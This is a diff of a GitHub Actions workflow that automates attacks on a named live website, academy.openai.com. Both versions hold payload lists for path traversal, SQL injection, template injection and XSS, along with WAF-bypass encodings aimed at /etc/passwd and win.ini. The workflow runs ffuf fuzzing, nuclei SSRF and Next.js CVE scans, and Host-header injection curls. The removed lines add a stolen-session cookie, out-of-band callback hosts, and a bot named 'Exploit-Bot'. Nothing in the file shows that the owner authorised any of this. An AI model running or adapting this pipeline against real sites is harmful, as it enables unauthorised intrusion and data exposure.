@@ -1,4 +1,4 @@
-name: "Heavy-Duty Crash Escalation — FIXED"
+name: "Heavy-Duty Middleware Escalation (Parallel)"
 
 on:
   workflow_dispatch:
@@ -6,88 +6,73 @@ on:
 permissions:
   contents: write
   issues: write
-
-env:
-  TARGET_URL: "https://academy.openai.com/?amp=test"
-  FUZZ_BASE: "https://academy.openai.com/?amp="
+  actions: read
 
 jobs:
-  escalate_500:
+  # Job 1: Fuzzing for Path Traversal & Logic Bypass
+  fuzz_traversal:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
+      - name: Install FFUF
+        run: go install github.com/ffuf/ffuf/v2@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
 
-      - name: Install Tools
+      - name: 📝 WAF Bypass Payloads
         run: |
-          go install github.com/ffuf/ffuf/v2@latest
-          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
-
-      - name: 🛠️ Setup Fresh Templates
-        run: nuclei -ut # Critical: Downloads latest template paths
-
-      - name: 📝 Generate Robust Payloads
-        run: |
-          # Create a real, local wordlist for FFUF
           cat <<EOF > payloads.txt
-          %00
-          ../../../../etc/passwd
-          {{7*7}}
-          \${7*7}
-          [object%20Object]
-          undefined
-          NaN
-          ' OR 1=1--
-          " OR 1=1--
-          <script>alert(1)</script>
-          http://127.0.0.1
-          http://oast.pro
+          ..%2f..%2f..%2fetc/passwd
+          ..%5c..%5c..%5cwindows/win.ini
+          .%2e/%2e%2e/%2e%2e/etc/passwd
+          ..%252f..%252f..%252fetc/passwd
+          ..%c0%af..%c0%afetc/passwd
+          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
           EOF
-          echo "Payloads created: $(wc -l < payloads.txt)"
 
-      - name: ☢️ Test 1:Advanced SSRF & OAST
+      - name: 🎯 Parallel Fuzz
         run: |
-          # Using the correct 2026 tag for SSRF fuzzing
-          nuclei -u "${{ env.FUZZ_BASE }}test" \
-            -tags ssrf,oast,fuzz \
-            -interactsh-server oast.fun \
-            -o ssrf_results.txt || true
+          ffuf -u "https://academy.openai.com/?amp=FUZZ" \
+               -w payloads.txt -mc 200,500,403 -v -o traversal_results.json
 
-      - name: 🎯 Test 2:FFUF Escalation (Verified)
-        run: |
-          # Added -v (verbose) to see why it crashed
-          ffuf -u "${{ env.FUZZ_BASE }}FUZZ" \
-               -w payloads.txt \
-               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" \
-               -mc 500 -v -o crash_matrix.json
+      - name: 📤 Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: traversal-results
+          path: traversal_results.json
 
-      - name: 🕵️ Test 3:Verbose Error Capture
+  # Job 2: Testing for SSRF and Next.js Specific CVEs
+  nuclei_scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Install Nuclei
+        run: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+
+      - name: ☢️ Scan for SSRF/Next.js CVEs
         run: |
-          # Save the full body of the 500 error to see if code leaks
-          curl -s -D headers.txt "${{ env.TARGET_URL }}" \
-               -H "Cookie: ${{ secrets.OPENAI_COOKIE }}" > response_body.html
+          nuclei -u "https://academy.openai.com/?amp=test" \
+            -t http/vulnerabilities/nextjs/ \
+            -t http/cves/2024/CVE-2024-34351.yaml \
+            -o nuclei_results.txt
+
+      - name: 📤 Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nuclei-results
+          path: nuclei_results.txt
+
+  # Job 3: Advanced Header Smuggling
+  header_smuggling:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 🕵️ Test Header Interaction
+        run: |
+          # Testing for HTTP Parameter Pollution and Host Injection
+          curl -v -I "https://academy.openai.com/?amp=1234" -H "X-Forwarded-Host: 127.0.0.1" > header_test_1.txt
+          curl -v -I "https://academy.openai.com/?amp=1234&amp=../../etc/passwd" > header_test_2.txt
           
-          # Scan the response for internal paths or software versions
-          grep -iE "stack|at |line |/home/|/var/|node_modules|python|version" response_body.html > findings.txt || true
-
-      - name: 🚨 Alert & Save
-        if: always()
-        run: |
-          if [ -s findings.txt ] || [ -s ssrf_results.txt ]; then
-            REPORT="### 🚨 CRASH ANALYSIS\n"
-            [ -s findings.txt ] && REPORT+="\n#### Leaked Data:\n\`\`\`\n$(cat findings.txt | head -n 10)\n\`\`\`"
-            
-            curl -X POST -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
-              -H "Content-Type: application/json" \
-              https://api.github.com/repos/${{ github.repository }}/issues \
-              -d "{\"title\":\"🚨 POTENTIAL EXPLOIT: amp 500\",\"body\":\"$REPORT\"}"
-          fi
-          
-          # Save results to repo
-          git config --local user.email "bot@hacker.ai"
-          git config --local user.name "Exploit-Bot"
-          git add .
-          git commit -m "Updated Crash Intel" || true
-          git push origin main || true
+      - name: 📤 Upload Results
+        uses: actions/upload-artifact@v4
+        with:
+          name: header-smuggling-results
+          path: header_test_*.txt
           
